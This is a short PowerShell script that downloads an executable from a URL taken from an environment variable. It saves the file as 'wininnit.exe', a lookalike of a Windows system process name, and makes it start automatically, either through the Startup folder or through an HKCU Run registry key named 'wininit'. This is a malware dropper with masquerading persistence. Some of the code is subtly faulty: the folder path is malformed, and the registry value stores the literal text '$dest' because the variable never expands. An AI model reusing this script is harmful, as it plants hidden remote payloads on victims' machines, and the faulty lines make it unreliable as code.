switch ( $env:method )
{
    1 {
        $dest = Join-Path $env:APPDATA "MICROSOFT\WINDOWS\START_MENU\PROGRAMS\STARTUP\wininnit.exe"
        Invoke-RestMethod -Uri $env:url -OutFile $dest
    }
    2 {
        $dest = Join-Path $env:APPDATA "wininnit.exe"
        Invoke-RestMethod -Uri $env:url -OutFile $dest
        $newItemPropertySplat = @{
            Path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
            Name = 'wininit'
            PropertyType = 'String'
            Value = '$dest'
        }
        New-ItemProperty @newItemPropertySplat
    }
}